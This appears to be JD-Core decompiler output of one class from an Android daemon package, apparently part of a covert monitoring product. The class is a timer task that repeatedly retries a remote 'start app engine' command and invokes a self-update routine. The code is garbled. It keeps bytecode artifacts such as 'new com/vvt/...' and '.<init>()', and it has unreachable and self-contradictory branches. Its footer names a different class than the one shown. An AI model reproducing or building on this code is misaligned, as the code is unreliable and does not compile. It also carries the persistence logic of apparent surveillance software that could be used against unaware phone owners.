package com.vvt.daemon;

import android.content.Context;
import android.os.SystemClock;
import com.vvt.autoupdate.d;
import com.vvt.m.b;
import com.vvt.polymorphic.command.RemoteStartAppEngine;
import java.io.IOException;
import java.util.TimerTask;

class c
  extends TimerTask
{
  c(MainDaemonMain paramMainDaemonMain) {}
  
  public void run()
  {
    int i = 0;
    Object localObject1 = null;
    int j = 0;
    boolean bool2 = false;
    Object localObject2 = null;
    i = 3;
    if (j < i)
    {
      localObject1 = new com/vvt/polymorphic/command/RemoteStartAppEngine;
      ((RemoteStartAppEngine)localObject1).<init>();
    }
    for (;;)
    {
      boolean bool1;
      try
      {
        localObject1 = ((RemoteStartAppEngine)localObject1).execute();
        localObject1 = (Boolean)localObject1;
        bool1 = ((Boolean)localObject1).booleanValue();
      }
      catch (IOException localIOException1)
      {
        try
        {
          localObject2 = this.a;
          bool2 = MainDaemonMain.a((MainDaemonMain)localObject2);
          if ((!bool2) || (bool1))
          {
            localObject2 = this.a;
            bool2 = MainDaemonMain.b((MainDaemonMain)localObject2);
            if (bool2)
            {
              localObject2 = new com/vvt/autoupdate/d;
              ((d)localObject2).<init>();
              Object localObject3 = this.a;
              localObject3 = MainDaemonMain.c((MainDaemonMain)localObject3);
              ((d)localObject2).a((Context)localObject3);
              localObject3 = b.c;
              ((d)localObject2).a((String)localObject3);
              ((d)localObject2).a();
              localObject2 = this.a;
              localObject3 = null;
              MainDaemonMain.a((MainDaemonMain)localObject2, false);
            }
          }
          if (bool1)
          {
            if (!bool1)
            {
              localObject1 = this.a;
              bool1 = MainDaemonMain.d((MainDaemonMain)localObject1);
              if (bool1) {}
              localObject1 = this.a;
              MainDaemonMain.e((MainDaemonMain)localObject1);
            }
            return;
          }
          localObject2 = this.a;
          bool2 = MainDaemonMain.d((MainDaemonMain)localObject2);
          if (bool2) {}
          long l = 500L;
          SystemClock.sleep(l);
          j += 1;
          bool2 = bool1;
        }
        catch (IOException localIOException2)
        {
          for (;;) {}
        }
        localIOException1 = localIOException1;
        bool1 = bool2;
      }
      localObject2 = this.a;
      bool2 = MainDaemonMain.d((MainDaemonMain)localObject2);
      if (bool2)
      {
        continue;
        bool1 = bool2;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */